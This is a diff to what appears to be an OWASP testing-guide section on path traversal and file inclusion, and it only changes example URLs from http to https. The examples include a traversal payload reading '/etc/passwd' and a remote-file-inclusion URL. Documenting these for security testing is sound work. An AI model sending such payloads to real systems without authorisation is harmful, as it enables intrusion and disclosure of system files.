@@ -43,9 +43,9 @@ Here are some examples of the checks to be performed at this stage:
 - Are there request parameters which could be used for file-related operations?
 - Are there unusual file extensions?
 - Are there interesting variable names?
-    - `http://example.com/getUserProfile.jsp?item=ikki.html`
-    - `http://example.com/index.php?file=content`
-    - `http://example.com/main.cgi?home=index.htm`
+    - `https://example.com/getUserProfile.jsp?item=ikki.html`
+    - `https://example.com/index.php?file=content`
+    - `https://example.com/main.cgi?home=index.htm`
 - Is it possible to identify cookies used by the web application for the dynamic generation of pages or templates?
     - `Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower`
     - `Cookie: USER=1826cc8f:PSTYLE=GreenDotRed`
@@ -57,13 +57,13 @@ The next stage of testing is analyzing the input validation functions present in
 **Note:** To successfully test for this flaw, the tester needs to have knowledge of the system being tested and the location of the files being requested. There is no point requesting `/etc/passwd` from an IIS web server.
 
 ```text
-http://example.com/getUserProfile.jsp?item=../../../../etc/passwd
+https://example.com/getUserProfile.jsp?item=../../../../etc/passwd
 ```
 
 Another common example is including content from an external source:
 
 ```text
-http://example.com/index.php?file=http://www.owasp.org/malicioustxt
+https://example.com/index.php?file=https://www.owasp.org/malicioustxt
 ```
 
 The same can be applied to cookies or any other input vector that is used for dynamic page generation.
